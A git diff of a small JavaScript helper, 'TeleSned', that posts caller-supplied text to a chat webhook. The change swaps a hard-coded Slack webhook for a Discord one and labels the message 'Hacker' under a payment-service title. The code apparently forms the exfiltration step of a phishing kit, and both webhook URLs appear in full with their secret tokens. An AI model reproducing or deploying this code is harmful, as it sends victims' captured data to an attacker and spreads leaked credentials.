@@ -2,16 +2,22 @@ import axios from 'axios';
 
 
 export const TeleSned = () => {
-    
+
     const Send = async (des) => {
-        const text = `مدونة سداد %0A ${des}`;
-        await axios.post(`https://hooks.slack.com/services/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`,JSON.stringify(text),{
-            withCredentials:false,
-            transformRequest:[(data,headers) =>{
-                delete headers.post["Content-Type"]
-                return text
-            }]
-        })
+        const body = {
+          content: "Hacker",
+          tts: false,
+          color: "white",
+          embeds: [
+            {
+              title: " مدونة سداد ",
+              description: des,
+           },
+          ],
+    };
+            
+        await axios.post("https://discord.com/api/webhooks/1365733429538197684/8rfdu4mryh-YYxu-nRdrNhXg15ay76Ct4Py1CuZZ7f2tl7HBjUUbjR9FpzBXU2gjG1w5",body)
+             
     }
   return {
     Send,
